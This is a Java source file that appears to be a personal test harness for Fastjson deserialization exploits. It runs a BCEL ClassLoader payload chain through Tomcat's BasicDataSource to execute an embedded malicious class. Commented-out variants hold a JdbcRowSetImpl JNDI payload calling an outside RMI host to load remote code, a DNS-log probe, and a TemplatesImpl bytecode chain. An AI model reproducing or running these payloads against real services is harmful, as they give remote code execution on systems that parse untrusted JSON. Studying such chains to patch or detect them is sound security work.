package fasjsonxxxx;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class fastjson124 {
    public static void main(String[] args) throws Exception{
//        System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
//        System.out.println();
        /*
        JdbcRowSetImpl调用链
         */
//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://121.196.109.163:8890/Evalclass\",\"autoCommit\":true}";
//        JSON.parse(payload);

//        dns
//        String payload = "{\"@type\":\"java.net.Inet6Address\",\"val\":\"xxx.rooagl.dnslog.cn\"}";




//        //bcel调用链条
        EvalClasstoBcel ecb = new EvalClasstoBcel();
        String bcel = ecb.getBcel(EvalClass.class);
//        String payloadforbcel = "{\n" +
//                "  \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
//                "  \"driverClassLoader\" :\n" +
//                "  {\n" +
//                "    \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
//                "  },\n" +
//                "  \"driverClassName\" :\" "+bcel+"\"\n" +
//                "}\n";
//        JSON.parseObject(payloadforbcel);
        String payloadforbcel2 = "{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \""+bcel+"\"\n" +
                "        }\n" +
                "    }: \"x\"\n" +
                "}";
        JSON.parse(payloadforbcel2);


//                String payload2 = "{\"@type\":\"" + NASTY_CLASS +
//                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_transletIndex\":0,\"_auxClasses\":{ },\"_outputProperties\":{ }}";


                    /*
                    获取恶意字节数组对象
             */
//        EvalClastoBytes evalClastoBytes = new EvalClastoBytes();
//        String NASTY_CLASS="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
//        String evilCode = evalClastoBytes.Starts(EvalClassforfastjsonTemplateImpl.class);
//        String payload2 = "{\"@type\":\"" + NASTY_CLASS +
//                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b',\"_outputProperties\":{ }}";
//                /*
//        TemplatesImpl调用链
//        是否支持此调用链的关键就是在调用fastjson还原json为对象的时候带上Feature.Support这个属性，
//        因爲payload中的_bytecodes屬性為私有屬性。
//        并且NonPublicField这个属性在1.2.22版本才引入的，在1.2.25版本就被修复
//         */
//        JSON.parseObject(payload2,Object.class, Feature.SupportNonPublicField);
    }
}
